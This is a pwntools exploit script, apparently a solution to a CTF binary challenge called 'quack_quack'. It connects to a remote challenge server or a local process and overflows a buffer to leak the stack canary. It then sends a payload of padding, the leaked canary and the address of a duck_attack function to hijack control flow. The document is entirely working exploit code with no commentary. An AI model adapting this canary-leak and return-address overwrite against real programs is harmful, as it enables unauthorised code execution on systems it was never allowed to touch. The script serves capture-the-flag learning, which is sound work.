from pwn import *

gs = '''

continue
'''

elf = context.binary = ELF("./quack_quack")

def start():
    if args.REMOTE:
        return remote("94.237.49.212", 30965)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.sendafter("> ",  b"A"*89 + b"Quack Quack ")

io.recvuntil("Quack Quack ")

leak_canary = int(hex(u64(io.recv(7).ljust(8, b"\x00"))) + "00", 16)

print(f"Canary: {hex(leak_canary)}")

offset = 88

payload = b"".join([
    b"A"*offset,
    p64(leak_canary),
    p64(0x4141414141414141),
    p64(elf.sym.duck_attack)
])

io.sendlineafter("> ", payload)

io.interactive()
